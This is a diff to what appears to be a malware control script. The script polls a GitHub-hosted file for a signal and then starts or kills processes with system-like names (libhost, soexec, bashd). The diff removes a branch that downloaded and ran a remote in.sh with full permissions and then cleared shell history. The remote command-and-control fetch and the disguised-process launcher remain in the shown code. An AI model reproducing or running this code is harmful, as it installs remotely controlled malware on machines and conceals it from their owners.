@@ -4,7 +4,8 @@ wget https://raw.githubusercontent.com/myvulweb/singal/master/1.txt -O /tmp/sing
 ret=`cat /tmp/singal-test.txt`
 
 echo $ret
-if [ "$ret" -eq 1 ]
+dest='1'
+if [ "$ret" = "$dest" ]
 then
 	echo "start"
 	if [ `ps -ef|grep /usr/bin/libhost | grep -v grep |wc -l`  -ge 1 ];then
@@ -21,23 +22,9 @@ then
 		/usr/bin/soexec &
 	fi
 
-elif [ "$ret" -eq 0 ]
-then
+else
 	echo "need to stop all"
 	killall libhost
 	killall soexec
 	killall bashd
-elif [ "$ret" -eq 2 ]
-then
-	echo "need to update"
-	wget https://raw.githubusercontent.com/myvulweb/mysh/master/in.sh -O /tmp/in.sh
-	chmod 777 /tmp/in.sh
-	/tmp/in.sh
-	rm -rf /tmp/in.sh
-	history -c
-
-else
-	echo "not defined!"
 fi
-
-
